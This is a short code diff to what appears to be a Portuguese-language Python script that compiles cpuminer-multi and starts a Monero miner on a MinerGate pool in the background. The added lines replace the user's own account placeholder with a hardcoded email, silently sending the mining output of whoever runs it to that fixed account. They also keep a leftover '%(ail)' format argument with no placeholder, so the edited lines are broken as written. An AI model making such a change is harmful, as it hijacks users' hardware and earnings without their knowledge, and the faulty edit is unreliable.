@@ -18,7 +18,7 @@ if path.isfile('cpuminer-multi/autogen.sh') == False:
   system('cd cpuminer-multi && ./autogen.sh && clear &&\
          CFLAGS="-march=native" ./configure && clear && make && clear && make install && clear')
   print('\033[33mConcluido. Mineracao iniciada.. ficarar Rodando em segundo Plano.\033[m')
-  system('minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u %s -p x' %(ail))
+  system('minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u elkaian0@gmail.com -p x' %(ail))
 else:
   print('\033[33mConcluido. Mineracao iniciada ficarar Rodando em segundo Plano.\033[m')
-  system('minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u %s -p x' %(ail))
+  system('minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u elkaian0@gmail.com -p x' %(ail))
